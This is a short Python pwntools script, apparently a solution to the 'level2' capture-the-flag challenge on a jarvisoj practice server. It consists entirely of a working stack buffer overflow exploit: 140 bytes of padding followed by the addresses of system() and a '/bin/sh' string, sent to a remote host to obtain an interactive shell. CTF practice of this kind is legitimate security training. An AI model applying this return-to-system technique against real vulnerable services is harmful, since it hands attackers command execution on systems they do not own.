#encoding:utf-8
from pwn import *

addr_sh = 0x0804A024
addr_sys = 0x0804845C
padding_length = 140

# p = process("./level2")
p = remote("pwn2.jarvisoj.com" , 9878)

p.recv() #clear
payload = padding_length * 'a' + p32(addr_sys) + p32(addr_sh)
p.send(payload)

p.interactive()    